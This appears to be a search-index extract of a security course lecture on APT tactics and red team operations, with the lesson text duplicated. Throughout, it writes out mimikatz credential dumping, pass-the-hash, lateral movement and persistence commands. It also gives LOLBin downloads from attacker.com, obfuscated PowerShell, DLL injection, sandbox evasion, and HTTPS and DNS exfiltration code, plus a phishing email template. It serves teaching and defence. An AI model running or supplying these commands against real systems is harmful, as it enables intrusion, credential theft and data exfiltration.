Kerberos tickets with compromised krbtgt hash. # Get krbtgt hash (domain admin required) mimikatz.exe \"lsadump::dcsync /domain:company.com /user:krbtgt\" # Create golden ticket mimikatz.exe \"kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:hash /ptt\" # Now have domain admin access indefinitely Lateral Movement Pass-the-Ticket # Export tickets mimikatz.exe \"sekurlsa::tickets /export\" # Import ticket mimikatz.exe \"kerberos::ptt ticket.kirbi\" # Access remote system dir \\\\server\\c$ PsExec # Using Sysinternals PsExec psexec.exe \\\\target -u domain\\user -p password cmd.exe # Using Impacket psexec.py domain/user:password@target WMI Execution # Execute command remotely wmic /node:target /user:domain\\user /password:pass process call create \"cmd.exe /c whoami\" # Using PowerShell Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c command\" -ComputerName target -Credential $cred SSH Lateral Movement # Use compromised keys ssh -i stolen_key user@target # Port forwarding to reach internal systems ssh -L 3389:internal-server:3389 user@jump-host # Dynamic SOCKS proxy ssh -D 8080 user@target # Configure proxychains to use localhost:8080 proxychains nmap 10.0.0.0/24 Command and Control (C2) C2 Frameworks Cobalt Strike: - Professional red team tool - Beacon payload (HTTP, DNS, SMB) - Malleable C2 profiles (customize traffic) - Post-exploitation modules Metasploit: - Meterpreter payload - Multiple C2 protocols - Extensive post-exploitation Empire/Starkiller: - PowerShell-based (Windows) - Python-based (Linux/Mac) - Modular architecture Covenant: - .NET-based C2 - Good for modern Windows C2 Communication Channels HTTP/HTTPS: Beacon \u2192 C2 Server GET /login.php HTTP/1.1 Host: legitimate-looking-domain.com Cookie: session=<encrypted_data> DNS: Query: a8f3d2e1.command.attacker.com Response: IP address encodes command Query: 01b2c3d4.exfil.attacker.com (data exfiltration) Social Media: - Commands via Twitter/Facebook posts - Responses via comments - Steganography in images Cloud Storage: - Commands in Dropbox files - Implant checks periodically - Legitimate traffic, hard to block Domain Fronting Hide C2 destination using CDN. SNI: legitimate-cdn.cloudfront.net Host header: attacker-controlled.cloudfront.net CDN routes to attacker server based on Host header, but TLS handshake shows legitimate domain. Defense Evasion Living Off the Land (LOLBins) Use legitimate Windows binaries for malicious purposes. Examples: # Download file using certutil certutil.exe -urlcache -f http://attacker.com/malware.exe malware.exe # Execute script using regsvr32 regsvr32.exe /s /n /u /i:http://attacker.com/evil.sct scrobj.dll # Download and execute using mshta mshta.exe http://attacker.com/payload.hta # Binary proxy execution using rundll32 rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write(\"<script>alert('code')</script>\") Process Injection Hide malicious code in legitimate process. Techniques: // Classic DLL injection HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID); LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath), NULL); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, pDllPath, 0, NULL); Process hollowing: 1. Create legitimate process in suspended state 2. Hollow out (unmap) its memory 3. Write malicious code 4. Resume execution Reflective DLL injection: - Load DLL without using LoadLibrary - Entirely in memory, no disk writes Obfuscation PowerShell obfuscation: # Original Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile malware.exe # Obfuscated $url='http://at'+'tacker.com/mal'+'ware.exe'; $out='mal'+'ware.exe'; .('I'+'nvoke-W'+'ebRequest') -Uri $url -OutFile $out # Base64 encoded powershell.exe -enc <base64_encoded_command> String encryption: # Encrypt strings in malware from cryptography.fernet import Fernet key = Fernet.generate_key() cipher = Fernet(key) # Encrypt C2 domain c2_domain = \"attacker.com\" encrypted = cipher.encrypt(c2_domain.encode()) # In malware: decrypt at runtime decrypted = cipher.decrypt(encrypted) Anti-Analysis Detect VMs and sandboxes: import os import subprocess def is_virtualized(): \"\"\"Check if running in VM\"\"\" # Check for VM artifacts vm_files = [ 'C:\\\\Windows\\\\System32\\\\drivers\\\\vmmouse.sys', 'C:\\\\Windows\\\\System32\\\\drivers\\\\vmhgfs.sys', '/dev/vmware' ] for f in vm_files: if os.path.exists(f): return True # Check for sandbox behavior if os.getenv('USERNAME') == 'sandbox': return True # Check uptime (sandboxes often have short uptime) uptime = int(subprocess.check_output('echo $(($(date +%s) - $(date -d \"$(uptime -s)\" +%s)))', shell=True)) if uptime < 600: # Less than 10 minutes return True return False if is_virtualized(): # Act benign or exit sys.exit(0) else: # Execute malicious payload run_payload() Data Exfiltration Encrypted Channels import requests from cryptography.fernet import Fernet def exfiltrate_data(data, c2_url, key): \"\"\"Exfiltrate encrypted data\"\"\" cipher = Fernet(key) encrypted = cipher.encrypt(data.encode()) # Send over HTTPS (legitimate-looking traffic) response = requests.post( c2_url, data={'data': encrypted}, headers={'User-Agent': 'Mozilla/5.0...'} ) return response.status_code == 200 DNS Tunneling import dns.resolver import base64 def exfil_via_dns(data, domain): \"\"\"Exfiltrate data via DNS queries\"\"\" # Encode and chunk data encoded = base64.b32encode(data.encode()).decode() chunk_size = 63 # DNS label max length for i in range(0, len(encoded), chunk_size): chunk = encoded[i:i+chunk_size] query = f\"{chunk}.{domain}\" try: dns.resolver.resolve(query, 'A') except: pass # Don't care about response Steganography from PIL import Image def hide_data_in_image(image_path, data, output_path): \"\"\"Hide data in image LSB\"\"\" img = Image.open(image_path) encoded = img.copy() pixels = encoded.load() # Convert data to binary binary_data = ''.join(format(ord(c), '08b') for c in data) binary_data += '1111111111111110' # End marker data_index = 0 for y in range(img.size[1]): for x in range(img.size[0]): if data_index < len(binary_data): pixel = list(pixels[x, y]) # Modify LSB of red channel pixel[0] = (pixel[0] & 0xFE) | int(binary_data[data_index]) pixels[x, y] = tuple(pixel) data_index += 1 else: break encoded.save(output_path) # Use: Upload image to social media, C2 extracts data Red Team Operations Operational Security (OPSEC) Principles: - Minimize footprint - Blend in with normal traffic - Rotate infrastructure - Use legitimate services - Clean up artifacts Tradecraft: - Use encryption for all communications - Separate testing and operational infrastructure - Document everything (for report) - Time operations appropriately - Have rollback plans Rules of Engagement Typical ROE includes: - Authorized scope (IP ranges, domains) - Prohibited actions (DoS, data destruction) - Time windows for testing - Escalation procedures - Communication protocols - Data handling requirements Post-Engagement Cleanup: - Remove backdoors - Delete implants - Clean logs (carefully, document first) - Remove accounts created - Close network connections Reporting: - Executive summary - Technical findings - Evidence (screenshots, logs) - Risk ratings - Remediation recommendations - Timeline of activities Key Takeaways APT characteristics: - Long-term, patient operations - Sophisticated techniques - Well-resourced - Clear objectives - Custom tooling Defensive lessons: - Assume breach mentality - Defense in depth essential - Monitor for TTPs, not just IOCs - Threat intelligence crucial - Continuous improvement Ethical considerations: - Always authorized testing only - Respect scope limitations - Document everything - Report responsibly - Clean up completely Remember: - These techniques are powerful - Use only with authorization - Legal consequences for misuse - Ethics matter - Skills should protect, not harm APT tactics represent the cutting edge of offensive security. Study them to better defend against real threats, practice in legal environments, and always use your skills ethically and responsibly.","title":"Lesson 9.3"},{"location":"LECTURES/unit9/lesson9-3/#apt-tactics-and-red-team-operations","text":"Advanced Persistent Threats (APTs) and sophisticated red teams use tactics far beyond simple exploits. This lesson explores the methodologies, techniques, and tools used in advanced offensive operations.","title":"APT Tactics and Red Team Operations"},{"location":"LECTURES/unit9/lesson9-3/#the-kill-chain","text":"","title":"The Kill Chain"},{"location":"LECTURES/unit9/lesson9-3/#lockheed-martin-cyber-kill-chain","text":"7 stages of attack: Reconnaissance - Research target Weaponization - Create malicious payload Delivery - Transmit weapon to target Exploitation - Trigger vulnerability Installation - Install backdoor Command & Control (C2) - Establish communication Actions on Objectives - Achieve goal Defensive value: Break the chain at any point to stop attack.","title":"Lockheed Martin Cyber Kill Chain"},{"location":"LECTURES/unit9/lesson9-3/#mitre-attck-framework","text":"Structured knowledge base of tactics and techniques. 14 Tactics: 1. Reconnaissance 2. Resource Development 3. Initial Access 4. Execution 5. Persistence 6. Privilege Escalation 7. Defense Evasion 8. Credential Access 9. Discovery 10. Lateral Movement 11. Collection 12. Command and Control 13. Exfiltration 14. Impact Each tactic contains multiple techniques and sub-techniques. Example - Persistence Techniques: - Boot or Logon Autostart Execution - Create Account - Scheduled Task/Job - Valid Accounts - Browser Extensions - Office Application Startup","title":"MITRE ATT&amp;CK Framework"},{"location":"LECTURES/unit9/lesson9-3/#initial-access","text":"","title":"Initial Access"},{"location":"LECTURES/unit9/lesson9-3/#spear-phishing","text":"Targeted phishing against specific individuals. Components of successful spear phishing: - Reconnaissance (social media, LinkedIn, company site) - Personalization (reference specific projects, people) - Context (timing matters - before deadlines, holidays) - Credible sender (compromised account or spoofing) - Compelling action (urgency, authority, curiosity) Example email: From: IT Support <itsupport@company.com> To: john.smith@company.com Subject: URGENT: Password Reset Required - Security Alert Hi John, We've detected suspicious login attempts on your account from an IP address in Russia. For your security, please reset your password immediately using this secure link: https://company-password-reset.com/reset?token=abc123 This link expires in 2 hours. If you don't reset your password, your account will be locked. Thank you, IT Security Team Red flags defenders should catch: - Domain typosquatting (company vs company) - Unusual urgency - External link for password reset - Grammar/spelling errors - Sender address doesn't match display name","title":"Spear Phishing"},{"location":"LECTURES/unit9/lesson9-3/#watering-hole-attacks","text":"Compromise websites target visits. Process: 1. Identify target organization 2. Research where employees browse 3. Compromise those websites 4. Inject malware/exploit 5. Wait for target to visit Example: - Target: Defense contractor employees - Watering hole: Industry news site they all read - Payload: Browser exploit or malicious download","title":"Watering Hole Attacks"},{"location":"LECTURES/unit9/lesson9-3/#supply-chain-attacks","text":"Compromise vendors to reach ultimate target. Types: - Software supply chain (malicious updates) - Hardware supply chain (backdoored components) - Service provider compromise (access to multiple clients) Famous examples: - SolarWinds (Orion platform compromise) - CCleaner (malicious update) - ASUS Live Update (backdoored software)","title":"Supply Chain Attacks"},{"location":"LECTURES/unit9/lesson9-3/#persistence-mechanisms","text":"","title":"Persistence Mechanisms"},{"location":"LECTURES/unit9/lesson9-3/#registry-run-keys-windows","text":"# Current user reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\malware.exe\" # All users (requires admin) reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Backdoor /t REG_SZ /d \"C:\\malware.exe\"","title":"Registry Run Keys (Windows)"},{"location":"LECTURES/unit9/lesson9-3/#scheduled-tasks","text":"# Create scheduled task schtasks /create /tn \"Windows Update\" /tr \"C:\\malware.exe\" /sc onlogon /ru SYSTEM # Or with XML for more control schtasks /create /tn \"Update\" /xml task.xml","title":"Scheduled Tasks"},{"location":"LECTURES/unit9/lesson9-3/#service-installation","text":"# Create malicious service sc create \"WindowsUpdater\" binPath= \"C:\\malware.exe\" start= auto # Start service sc start \"WindowsUpdater\"","title":"Service Installation"},{"location":"LECTURES/unit9/lesson9-3/#wmi-event-subscription","text":"Fileless persistence: # Create event filter (trigger) $Filter = Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{ Name = \"UpdateFilter\" EventNamespace = \"root\\cimv2\" QueryLanguage = \"WQL\" Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" } # Create consumer (action) $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{ Name = \"UpdateConsumer\" CommandLineTemplate = \"powershell.exe -enc <base64_payload>\" } # Bind filter to consumer Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{ Filter = $Filter Consumer = $Consumer }","title":"WMI Event Subscription"},{"location":"LECTURES/unit9/lesson9-3/#linux-persistence","text":"Cron jobs: # User crontab echo \"@reboot /tmp/.hidden/backdoor.sh\" | crontab - # System-wide echo \"@reboot root /tmp/.hidden/backdoor.sh\" >> /etc/crontab Systemd service: # Create service file cat > /etc/systemd/system/update.service << EOF [Unit] Description=System Update Service [Service] Type=simple ExecStart=/tmp/.hidden/backdoor.sh Restart=always [Install] WantedBy=multi-user.target EOF # Enable and start systemctl enable update.service systemctl start update.service SSH keys: # Add attacker's public key mkdir -p ~/.ssh echo \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys","title":"Linux Persistence"},{"location":"LECTURES/unit9/lesson9-3/#credential-access","text":"","title":"Credential Access"},{"location":"LECTURES/unit9/lesson9-3/#credential-dumping","text":"Mimikatz (Windows): # Dump passwords from LSASS mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" # Dump cached credentials mimikatz.exe \"lsadump::cache\" \"exit\" # Dump SAM database mimikatz.exe \"lsadump::sam\" \"exit\" # Export tickets for pass-the-ticket mimikatz.exe \"sekurlsa::tickets /export\" \"exit\" Dumping /etc/shadow (Linux): # Read shadow file (requires root) cat /etc/shadow # Unshadow for cracking unshadow /etc/passwd /etc/shadow > hashes.txt john hashes.txt","title":"Credential Dumping"},{"location":"LECTURES/unit9/lesson9-3/#pass-the-hash","text":"Use NTLM hash without cracking password. # Using pth-toolkit pth-winexe -U domain/user%hash //target cmd.exe # Using Impacket psexec.py -hashes :ntlm_hash user@target # Using CrackMapExec crackmapexec smb target -u user -H ntlm_hash","title":"Pass-the-Hash"},{"location":"LECTURES/unit9/lesson9-3/#kerberoasting","text":"Extract and crack service account passwords. # Request service tickets Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/server.domain.com\" # Export tickets Invoke-Mimikatz -Command '\"kerberos::list /export\"' # Offline cracking hashcat -m 13100 ticket.kirbi wordlist.txt","title":"Kerberoasting"},{"location":"LECTURES/unit9/lesson9-3/#golden-ticket-attack","text":"Forge Kerberos tickets with compromised krbtgt hash. # Get krbtgt hash (domain admin required) mimikatz.exe \"lsadump::dcsync /domain:company.com /user:krbtgt\" # Create golden ticket mimikatz.exe \"kerberos::golden /user:Administrator /domain:company.com /sid:S-1-5-21-... /krbtgt:hash /ptt\" # Now have domain admin access indefinitely","title":"Golden Ticket Attack"},{"location":"LECTURES/unit9/lesson9-3/#lateral-movement","text":"","title":"Lateral Movement"},{"location":"LECTURES/unit9/lesson9-3/#pass-the-ticket","text":"# Export tickets mimikatz.exe \"sekurlsa::tickets /export\" # Import ticket mimikatz.exe \"kerberos::ptt ticket.kirbi\" # Access remote system dir \\\\server\\c$","title":"Pass-the-Ticket"},{"location":"LECTURES/unit9/lesson9-3/#psexec","text":"# Using Sysinternals PsExec psexec.exe \\\\target -u domain\\user -p password cmd.exe # Using Impacket psexec.py domain/user:password@target","title":"PsExec"},{"location":"LECTURES/unit9/lesson9-3/#wmi-execution","text":"# Execute command remotely wmic /node:target /user:domain\\user /password:pass process call create \"cmd.exe /c whoami\" # Using PowerShell Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c command\" -ComputerName target -Credential $cred","title":"WMI Execution"},{"location":"LECTURES/unit9/lesson9-3/#ssh-lateral-movement","text":"# Use compromised keys ssh -i stolen_key user@target # Port forwarding to reach internal systems ssh -L 3389:internal-server:3389 user@jump-host # Dynamic SOCKS proxy ssh -D 8080 user@target # Configure proxychains to use localhost:8080 proxychains nmap 10.0.0.0/24","title":"SSH Lateral Movement"},{"location":"LECTURES/unit9/lesson9-3/#command-and-control-c2","text":"","title":"Command and Control (C2)"},{"location":"LECTURES/unit9/lesson9-3/#c2-frameworks","text":"Cobalt Strike: - Professional red team tool - Beacon payload (HTTP, DNS, SMB) - Malleable C2 profiles (customize traffic) - Post-exploitation modules Metasploit: - Meterpreter payload - Multiple C2 protocols - Extensive post-exploitation Empire/Starkiller: - PowerShell-based (Windows) - Python-based (Linux/Mac) - Modular architecture Covenant: - .NET-based C2 - Good for modern Windows","title":"C2 Frameworks"},{"location":"LECTURES/unit9/lesson9-3/#c2-communication-channels","text":"HTTP/HTTPS: Beacon \u2192 C2 Server GET /login.php HTTP/1.1 Host: legitimate-looking-domain.com Cookie: session=<encrypted_data> DNS: Query: a8f3d2e1.command.attacker.com Response: IP address encodes command Query: 01b2c3d4.exfil.attacker.com (data exfiltration) Social Media: - Commands via Twitter/Facebook posts - Responses via comments - Steganography in images Cloud Storage: - Commands in Dropbox files - Implant checks periodically - Legitimate traffic, hard to block","title":"C2 Communication Channels"},{"location":"LECTURES/unit9/lesson9-3/#domain-fronting","text":"Hide C2 destination using CDN. SNI: legitimate-cdn.cloudfront.net Host header: attacker-controlled.cloudfront.net CDN routes to attacker server based on Host header, but TLS handshake shows legitimate domain.","title":"Domain Fronting"},{"location":"LECTURES/unit9/lesson9-3/#defense-evasion","text":"","title":"Defense Evasion"},{"location":"LECTURES/unit9/lesson9-3/#living-off-the-land-lolbins","text":"Use legitimate Windows binaries for malicious purposes. Examples: # Download file using certutil certutil.exe -urlcache -f http://attacker.com/malware.exe malware.exe # Execute script using regsvr32 regsvr32.exe /s /n /u /i:http://attacker.com/evil.sct scrobj.dll # Download and execute using mshta mshta.exe http://attacker.com/payload.hta # Binary proxy execution using rundll32 rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write(\"<script>alert('code')</script>\")","title":"Living Off the Land (LOLBins)"},{"location":"LECTURES/unit9/lesson9-3/#process-injection","text":"Hide malicious code in legitimate process. Techniques: // Classic DLL injection HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID); LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath), NULL); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LoadLibraryA, pDllPath, 0, NULL); Process hollowing: 1. Create legitimate process in suspended state 2. Hollow out (unmap) its memory 3. Write malicious code 4. Resume execution Reflective DLL injection: - Load DLL without using LoadLibrary - Entirely in memory, no disk writes","title":"Process Injection"},{"location":"LECTURES/unit9/lesson9-3/#obfuscation","text":"PowerShell obfuscation: # Original Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile malware.exe # Obfuscated $url='http://at'+'tacker.com/mal'+'ware.exe'; $out='mal'+'ware.exe'; .('I'+'nvoke-W'+'ebRequest') -Uri $url -OutFile $out # Base64 encoded powershell.exe -enc <base64_encoded_command> String encryption: # Encrypt strings in malware from cryptography.fernet import Fernet key = Fernet.generate_key() cipher = Fernet(key) # Encrypt C2 domain c2_domain = \"attacker.com\" encrypted = cipher.encrypt(c2_domain.encode()) # In malware: decrypt at runtime decrypted = cipher.decrypt(encrypted)","title":"Obfuscation"},{"location":"LECTURES/unit9/lesson9-3/#anti-analysis","text":"Detect VMs and sandboxes: import os import subprocess def is_virtualized(): \"\"\"Check if running in VM\"\"\" # Check for VM artifacts vm_files = [ 'C:\\\\Windows\\\\System32\\\\drivers\\\\vmmouse.sys', 'C:\\\\Windows\\\\System32\\\\drivers\\\\vmhgfs.sys', '/dev/vmware' ] for f in vm_files: if os.path.exists(f): return True # Check for sandbox behavior if os.getenv('USERNAME') == 'sandbox': return True # Check uptime (sandboxes often have short uptime) uptime = int(subprocess.check_output('echo $(($(date +%s) - $(date -d \"$(uptime -s)\" +%s)))', shell=True)) if uptime < 600: # Less than 10 minutes return True return False if is_virtualized(): # Act benign or exit sys.exit(0) else: # Execute malicious payload run_payload()","title":"Anti-Analysis"},{"location":"LECTURES/unit9/lesson9-3/#data-exfiltration","text":"","title":"Data Exfiltration"},{"location":"LECTURES/unit9/lesson9-3/#encrypted-channels","text":"import requests from cryptography.fernet import Fernet def exfiltrate_data(data, c2_url, key): \"\"\"Exfiltrate encrypted data\"\"\" cipher = Fernet(key) encrypted = cipher.encrypt(data.encode()) # Send over HTTPS (legitimate-looking traffic) response = requests.post( c2_url, data={'data': encrypted}, headers={'User-Agent': 'Mozilla/5.0...'} ) return response.status_code == 200","title":"Encrypted Channels"},{"location":"LECTURES/unit9/lesson9-3/#dns-tunneling","text":"import dns.resolver import base64 def exfil_via_dns(data, domain): \"\"\"Exfiltrate data via DNS queries\"\"\" # Encode and chunk data encoded = base64.b32encode(data.encode()).decode() chunk_size = 63 # DNS label max length for i in range(0, len(encoded), chunk_size): chunk = encoded[i:i+chunk_size] query = f\"{chunk}.{domain}\" try: dns.resolver.resolve(query, 'A') except: pass # Don't care about response","title":"DNS Tunneling"},{"location":"LECTURES/unit9/lesson9-3/#steganography","text":"from PIL import Image def hide_data_in_image(image_path, data, output_path): \"\"\"Hide data in image LSB\"\"\" img = Image.open(image_path) encoded = img.copy() pixels = encoded.load() # Convert data to binary binary_data = ''.join(format(ord(c), '08b') for c in data) binary_data += '1111111111111110' # End marker data_index = 0 for y in range(img.size[1]): for x in range(img.size[0]): if data_index < len(binary_data): pixel = list(pixels[x, y]) # Modify LSB of red channel pixel[0] = (pixel[0] & 0xFE) | int(binary_data[data_index]) pixels[x, y] = tuple(pixel) data_index += 1 else: break encoded.save(output_path) # Use: Upload image to social media, C2 extracts data","title":"Steganography"},{"location":"LECTURES/unit9/lesson9-3/#red-team-operations","text":"","title":"Red Team Operations"},{"location":"LECTURES/unit9/lesson9-3/#operational-security-opsec","text":"Principles: - Minimize footprint - Blend in with normal traffic - Rotate infrastructure - Use legitimate services - Clean up artifacts Tradecraft: - Use encryption for all communications - Separate testing and operational infrastructure - Document everything (for report) - Time operations appropriately - Have rollback plans","title":"Operational Security (OPSEC)"},{"location":"LECTURES/unit9/lesson9-3/#rules-of-engagement","text":"Typical ROE includes: - Authorized scope (IP ranges, domains) - Prohibited actions (DoS, data destruction) - Time windows for testing - Escalation procedures - Communication protocols - Data handling requirements","title":"Rules of Engagement"},{"location":"LECTURES/unit9/lesson9-3/#post-engagement","text":"Cleanup: - Remove backdoors - Delete implants - Clean logs (carefully, document first) - Remove accounts created - Close network connections Reporting: - Executive summary - Technical findings - Evidence (screenshots, logs) - Risk ratings - Remediation recommendations - Timeline of activities","title":"Post-Engagement"},{"location":"LECTURES/unit9/lesson9-3/#key-takeaways","text":"APT characteristics: - Long-term, patient operations - Sophisticated techniques - Well-resourced - Clear objectives - Custom tooling Defensive lessons: - Assume breach mentality - Defense in depth essential - Monitor for TTPs, not just IOCs - Threat intelligence crucial - Continuous improvement Ethical considerations: - Always authorized testing only - Respect scope limitations - Document everything - Report responsibly - Clean up completely Remember: - These techniques are powerful - Use only with authorization - Legal consequences for misuse - Ethics matter - Skills should protect, not harm APT tactics represent the cutting edge of offensive security. Study them to better defend against real threats, practice in legal environments, and always use your skills ethically and responsibly.","title":"Key Takeaways"}]}